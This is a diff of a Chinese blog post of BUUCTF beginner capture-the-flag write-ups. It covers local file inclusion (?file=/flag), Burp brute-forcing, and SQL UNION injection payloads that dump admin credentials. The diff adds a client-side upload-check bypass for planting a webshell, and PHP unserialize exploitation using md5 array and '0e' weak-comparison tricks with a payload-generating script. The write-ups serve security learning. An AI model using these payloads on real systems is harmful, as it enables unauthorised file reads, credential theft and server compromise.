@@ -27,7 +27,7 @@
 <meta property="og:description" content="BUUCTF 的 Basic 题库，题解，持续更新中。基本上是从零开始学，所有题解均参考自网络，感谢前辈们的奉献。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T13:59:07.000Z">
-<meta property="article:modified_time" content="2023-08-28T12:47:14.986Z">
+<meta property="article:modified_time" content="2023-08-31T09:11:37.513Z">
 <meta property="article:author" content="az1mus">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="basic">
@@ -114,7 +114,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-Labs"><span class="nav-number">1.</span> <span class="nav-text">Linux Labs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-LFI-COURSE-1"><span class="nav-number">2.</span> <span class="nav-text">BUU LFI COURSE 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-BRUTE-1"><span class="nav-number">3.</span> <span class="nav-text">BUU BRUTE 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-SQL-COURSE-1"><span class="nav-number">4.</span> <span class="nav-text">BUU SQL COURSE 1</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-Labs-SSH"><span class="nav-number">1.</span> <span class="nav-text">Linux Labs: SSH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-LFI-COURSE-1"><span class="nav-number">2.</span> <span class="nav-text">BUU LFI COURSE 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-BRUTE-1-Burp-Suite-Intruder"><span class="nav-number">3.</span> <span class="nav-text">BUU BRUTE 1: Burp Suite Intruder</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-SQL-COURSE-1"><span class="nav-number">4.</span> <span class="nav-text">BUU SQL COURSE 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-Labs-Linux-Weevely"><span class="nav-number">5.</span> <span class="nav-text">Upload-Labs-Linux: Weevely</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-CODE-REVIEW-1-Burp-Suite-Repeater"><span class="nav-number">6.</span> <span class="nav-text">BUU CODE REVIEW 1: Burp Suite Repeater</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -140,7 +140,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -212,7 +212,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-08-28 20:47:14" itemprop="dateModified" datetime="2023-08-28T20:47:14+08:00">2023-08-28</time>
+      <time title="修改时间：2023-08-31 17:11:37" itemprop="dateModified" datetime="2023-08-31T17:11:37+08:00">2023-08-31</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -236,15 +236,15 @@
     <div class="post-body" itemprop="articleBody"><p>BUUCTF 的 Basic 题库，题解，持续更新中。基本上是从零开始学，所有题解均参考自网络，感谢前辈们的奉献。  </p>
 <span id="more"></span>
 
-<h2 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h2><p>“ssh 用户名：root 密码：123456 地址和端口为动态分配的。”题目给出了ssh用户名与密码，尝试ssh连接。  </p>
+<h2 id="Linux-Labs-SSH"><a href="#Linux-Labs-SSH" class="headerlink" title="Linux Labs: SSH"></a>Linux Labs: SSH</h2><p>“ssh 用户名：root 密码：123456 地址和端口为动态分配的。”题目给出了ssh用户名与密码，尝试ssh连接。  </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh [-p port] &lt;username@domain&gt;</span><br><span class="line"><span class="comment"># 输入密码进入shell之后</span></span><br><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="comment"># ... flag.txt ...</span></span><br><span class="line"><span class="built_in">cat</span> /flag.txt</span><br></pre></td></tr></table></figure>
 
 <p>有关<code>ssh</code>的内容参考<a href="/2023/08/21/SSH-Known_Hosts-Management/" title="管理 SSH known hosts">另一篇文章</a>。  </p>
 <h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><p>本地文件包含(LFI, Local File Include)，是 PHP 的常见写法。程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程一般被称为文件包含<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43965597/article/details/126389392">[1]</a>。</p>
-<p>审计题目提供的 php 代码，发现不安全地使用了 include 函数。构造 payload：<code>?file=&lt;filename&gt;</code>便可以显示文件内容。</p>
+<p>审计题目提供的 PHP 代码，发现不安全地使用了 include 函数。构造 payload：<code>?file=&lt;filename&gt;</code>便可以显示文件内容。</p>
 <p>构造<code>?file=/flag</code>得到 flag。除此之外，还可以查看其他的文件，比如<code>/var/log/nginx/access.log</code>查看 nginx 文件记录。</p>
-<p>除了 include 之外，php 还有其他<a href="/2023/08/21/Dangerous-Functions-in-PHP/" title="PHP 危险函数总结">常见危险函数</a>。</p>
-<h2 id="BUU-BRUTE-1"><a href="#BUU-BRUTE-1" class="headerlink" title="BUU BRUTE 1"></a>BUU BRUTE 1</h2><p>使用 Burp Suite 的 Intruder 设置针对 payload 的爆破攻击。题目在 response 的文本中给足了信息，所以可以直接根据提示设置爆破规则。</p>
+<p>除了 include 之外，PHP 还有其他<a href="/2023/08/21/Dangerous-Functions-in-PHP/" title="PHP 危险函数总结">常见危险函数</a>。</p>
+<h2 id="BUU-BRUTE-1-Burp-Suite-Intruder"><a href="#BUU-BRUTE-1-Burp-Suite-Intruder" class="headerlink" title="BUU BRUTE 1: Burp Suite Intruder"></a>BUU BRUTE 1: Burp Suite Intruder</h2><p>使用 Burp Suite 的 Intruder 设置针对 payload 的爆破攻击。题目在 response 的文本中给足了信息，所以可以直接根据提示设置爆破规则。</p>
 <h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>网页含有登录页，提交万能密码验证均失败。</p>
 <p>这时要打开 F12 审阅网站代码，初看没有脚本问题。点击网页按钮查看网络，发现经过 backend&#x2F;content_detail.php 的 get request 传入页面内容请求， backend&#x2F;login 的 post 传入登录请求，构造 payload 为 id&#x3D;1~3 时有新闻栏的 response。尝试针对 id 进行 SQL UNION 注入构造 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 UNION SELECT (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;news&#x27;),(select group_concat(schema_name) from information_schema.schemata)--+</span><br></pre></td></tr></table></figure>
@@ -257,6 +257,35 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> (<span class="keyword">select</span> group_concat(username,password) <span class="keyword">from</span> admin),(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;news&#x27;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p>--把后面的部分注释掉。有关包括万能密码、payload 注入的粗略的 SQL 注入可以看<a href="/2023/08/28/Junior-SQL-Injection/" title="粗略的 SQL 注入总结">这篇文章</a>。重点在于利用元数据和混淆。</p>
+<h2 id="Upload-Labs-Linux-Weevely"><a href="#Upload-Labs-Linux-Weevely" class="headerlink" title="Upload-Labs-Linux: Weevely"></a>Upload-Labs-Linux: Weevely</h2><p>通过这一题对 webshell 形成初步了解。这一题绕过检测上传 webshell 的方法很弱智：他的检测函数是 js，写在前端里，并且还在前端调用了。只需要把<code>on-submit</code>改成<code>&quot;return 1&quot;</code>即可上传任意文件。</p>
+<p>关于 webshell，可以看看<a href="/2023/08/30/Webshell-Introduction/" title="Webshell 入门">这篇文章</a>。</p>
+<h2 id="BUU-CODE-REVIEW-1-Burp-Suite-Repeater"><a href="#BUU-CODE-REVIEW-1-Burp-Suite-Repeater" class="headerlink" title="BUU CODE REVIEW 1: Burp Suite Repeater"></a>BUU CODE REVIEW 1: Burp Suite Repeater</h2><p>代码审计。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/10/6</span></span><br><span class="line"><span class="comment"> * Time: 8:04 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题干的 PHP 代码指出，当类<code>BUU</code>析构时会输出 flag。那么，在程序中构造<code>BUU</code>即可。审阅题干，发现用到了<code>unserialize($_POST[&#39;obj&#39;])</code>。为了让网页输出 flag，需要满足：</p>
+<blockquote>
+<p>进入<code>unserialize()</code>所需的条件判断<br><code>serialize</code>处理后的<code>BUU</code>类<br><code>BUU</code>成员<code>correct</code>和<code>input</code>符合析构函数中需要的条件</p>
+</blockquote>
+<p>为此，需要传 get 和 post 请求，然后求符合条件的<code>md51</code> <code>md52</code> <code>obj</code>在 post 里上传。</p>
+<p>利用 Burp Suite 的 Repeater，可以编辑 post 请求并发送。获取<code>md51</code> <code>md52</code> <code>obj</code>，需要相关的 PHP 知识。</p>
+<ul>
+<li><p>数组的特殊性</p>
+<p>具体地，对于一个数组<code>$arr</code>，无论其中有什么元素，当其被双引号括起来解析后，他会被识别为字符串<code>&#39;Array&#39;</code>。在题目里，如果<code>md51</code>是数组，当它作为<code>$_POST[&#39;md51&#39;]</code>传入<code>md5()</code>函数后，实际上函数的返回值等于<code>md5(&#39;Array&#39;)</code>。这样，传入不同的数组<code>md51</code>和<code>md52</code>，就能满足条件<code>md5($_POST[&#39;md51&#39;]) == md5($_POST[&#39;md52&#39;]) &amp;&amp; $_POST[&#39;md51&#39;] != $_POST[&#39;md52&#39;]</code>。</p>
+</li>
+<li><p>弱类型</p>
+<p>当 PHP 进行弱比较<code>==</code>时，系统会自动处理数据类型。在<a href="/2023/08/21/Dangerous-Functions-in-PHP/" title="PHP 危险函数总结">讲解PHP危险函数</a>一文中，提到过符合科学计数法的字符串会被视为数字处理。也就是说，虽然很难构造两个完全一样的 md5，但是因为弱比较的特性，只需要构造两个哈希之后都是以<code>0e</code>开头的字符串即可，这是相对简单的。</p>
+<p>例如，字符串<code>&#39;QNKCDZO&#39;</code>和字符串<code>&#39;s1836677006a&#39;</code>经过 md5 之后都是以<code>&#39;0e&#39;</code>开头。</p>
+</li>
+<li><p>引用</p>
+<p>和 C++ 类似，PHP 中有引用的概念。当变量前加上<code>&amp;</code>符号即可将其引用赋值给其他变量，之后两个变量同步变化，无论何时都相等。</p>
+<p>具体在题目中，声明<code>BUU</code>时，将其成员变量<code>$input</code>赋值为<code>&amp;$correct</code>即可完成引用赋值，类似“绑定”，绕过析构函数中的值相等检测。</p>
+</li>
+</ul>
+<p>payload 里的<code>md51</code> <code>md52</code>可以这么写：<code>md51[]=1&amp;md52[]=2</code>或<code>md51=QNKCDZO&amp;md52=s1836677006a</code>。payload 里的<code>obj</code>可以运行以下 PHP 程序得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;input = &amp;<span class="variable">$a</span>-&gt;correct;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Linux 上通过<code>php</code>命令可以直接运行<code>.php</code>后缀名的文件。</p>
+<p>之后，在 Burp Suite 中，拦截并编辑 request ，发送后即可获得 flag。</p>
 
     </div>
 
